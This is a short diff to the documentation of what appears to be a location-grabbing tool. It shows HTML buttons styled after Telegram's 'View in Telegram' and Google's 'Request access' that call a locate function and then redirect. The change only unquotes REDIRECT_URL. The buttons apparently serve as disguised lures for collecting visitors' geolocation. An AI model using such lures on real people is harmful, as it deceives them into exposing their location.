@@ -15,7 +15,7 @@ For the location, the `location` function must be called (on a button click or a
 ```
 <a class="tgme_action_button_new" onclick="locate(popup, function(){$('#change').html('Failed');});">View in Telegram</a>
 Or for a redirect:
-<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>
+<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location=REDIRECT_URL;}, function(){$('#change').html('Failed');});">Request access</button>
 ```
 
 ## Template files
